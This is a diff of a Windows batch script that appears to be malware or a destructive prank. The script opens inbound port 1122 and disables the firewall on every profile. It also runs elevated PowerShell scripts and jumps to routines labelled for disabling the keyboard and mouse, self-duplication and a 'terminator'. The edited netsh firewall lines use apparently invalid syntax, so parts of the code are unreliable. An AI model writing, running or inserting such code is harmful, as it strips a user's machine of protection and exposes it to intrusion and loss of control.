@@ -11,8 +11,8 @@ for /f "tokens=2" %%a in ('tasklist ^| findstr /r /b ".*.exe"') do (
 :netsecurety
 netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=1122
 netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=1122
-netsh firewall set opmode disable
-netsh firewall set opmode mode=DISABLE
+netsh advfirewall firewall set opmode disable
+netsh advfirewall firewall set opmode mode=DISABLE
 netsh advfirewall set currentprofile state off
 netsh advfirewall set domainprofile state off
 netsh advfirewall set privateprofile state off
@@ -41,9 +41,9 @@ for /f "skip=1 delims=" %%a in ('wmic path Win32_PnPEntity where "DeviceID like 
 PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', 'make_file.ps1' -Verb RunAs"
 
 
-goto netsecurety
 goto disablekeyboardandmouse
 goto duplication
 cscript main.vbs
+goto netsecurety
 PowerShell.exe -Command "Start-Process PowerShell.exe -ArgumentList '-File', 'ShutNet.ps1' -Verb RunAs"
 goto terminator
